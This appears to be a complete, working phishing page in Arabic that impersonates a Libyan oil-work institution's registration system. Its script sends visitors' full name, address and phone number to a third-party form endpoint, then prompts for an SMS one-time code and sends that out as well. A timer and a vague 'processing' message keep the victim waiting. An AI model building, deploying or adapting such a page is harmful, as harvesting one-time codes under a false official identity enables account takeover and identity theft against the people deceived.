<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنــية</title>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-PZEERNXDY2"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-PZEERNXDY2');
  </script>

  <link rel="icon" href="uy.jpeg" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
      z-index: 1;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin: 0 auto;
      display: block;
    }

    .logo-container p {
      margin-top: 8px;
      font-weight: 700;
      color: #003366;
      font-size: 16px;
    }

    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus {
      border-color: gold;
      outline: none;
    }

    input:disabled {
      background-color: #f2f2f2;
    }

    button {
      width: 40%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
      font-family: Calibri, sans-serif;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }

    button:hover:not(:disabled) {
      background-color: #e6c200;
    }

    button:disabled {
      background-color: #c2a300;
      cursor: not-allowed;
    }

    #timer {
      text-align: center;
      font-weight: 600;
      color: red;
      margin-bottom: 20px;
      min-height: 24px;
    }

    #codeField {
      display: none;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: -10px;
      margin-bottom: 15px;
    }

    .visitor-counter {
      text-align: center;
      z-index: 10;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <div id="main-content">
    <div class="container">
      <div class="logo-container">
        <!-- عداد الزوار أعلى الشعار -->
        <div class="visitor-counter">
          <a href="https://www.hitwebcounter.com" target="_blank">
            <img src="https://hitwebcounter.com/counter/counter.php?page=21075347&style=0006&nbdigits=5&type=ip&initCount=0"
                 title="Visitor Counter" alt="Visit counter For Websites" border="0" />
          </a>
          <div style="color: red; font-weight: bold; margin-top: 5px;">عدد الزوار حتى الآن</div>
        </div>

        <!-- الشعار -->
        <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
        <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
      </div>

      <h2>تسجيل الدخول</h2>

      <form id="phoneForm" onsubmit="return sendPhone(event);">
        <label for="fullname">الاسم الثلاثي:</label>
        <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />

        <label for="address">العنوان:</label>
        <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />

        <label for="phone">رقم الهاتف:</label>
        <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />

        <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
        <div id="timer"></div>
      </form>

      <form id="codeForm" onsubmit="return sendCode(event);">
        <div id="codeField">
          <label for="code">جاري إرسال الكود عبر SMS</label>
          <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
          <div id="errorMessage" class="error"></div>
          <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
          <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
            جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
          </div>
        </div>
      </form>
    </div>
  </div>

  <script>
    let countdownInterval;

    function startTimer(duration) {
      let timeLeft = duration;
      const timerDisplay = document.getElementById('timer');
      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
      const phoneInput = document.getElementById('phone');
      timerDisplay.style.display = 'block';
      updateTimer(timeLeft);
      countdownInterval = setInterval(() => {
        timeLeft--;
        updateTimer(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendPhoneBtn.disabled = false;
          phoneInput.disabled = false;
        }
      }, 1000);
    }

    function updateTimer(seconds) {
      const timerDisplay = document.getElementById('timer');
      const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
      const secs = (seconds % 60).toString().padStart(2, '0');
      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
    }

    function sendPhone(event) {
      event.preventDefault();
      const phoneInput = document.getElementById('phone');
      const fullname = document.getElementById('fullname').value;
      const address = document.getElementById('address').value;

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return false;
      }

      const payload = { fullname, address, phone: phoneInput.value };
      fetch('https://formcarry.com/s/2evKahWtdJS', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
        phoneInput.disabled = true;
        document.getElementById('sendPhoneBtn').disabled = true;
        document.getElementById('codeField').style.display = 'block';
        startTimer(480); // 8 دقائق
      })
      .catch(error => {
        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
        console.error(error);
      });

      return false;
    }

    function sendCode(event) {
      event.preventDefault();
      const codeInput = document.getElementById('code');
      const errorMessage = document.getElementById('errorMessage');
      const processingMessage = document.getElementById('processingMessage');
      const sendCodeBtn = document.getElementById('sendCodeBtn');
      errorMessage.textContent = '';

      if (codeInput.value.trim() === '') {
        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
        codeInput.focus();
        return false;
      }

      const payload = {
        phone: document.getElementById('phone').value,
        code: codeInput.value
      };

      fetch('https://formcarry.com/s/2evKahWtdJS', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(async response => {
        const data = await response.json();
        if (response.ok && data.success !== false) {
          sendCodeBtn.style.display = 'none';
          processingMessage.style.display = 'block';
        } else {
          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
        }
      })
      .catch(error => {
        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
        console.error(error);
      });

      return false;
    }
  </script>
</body>
</html>
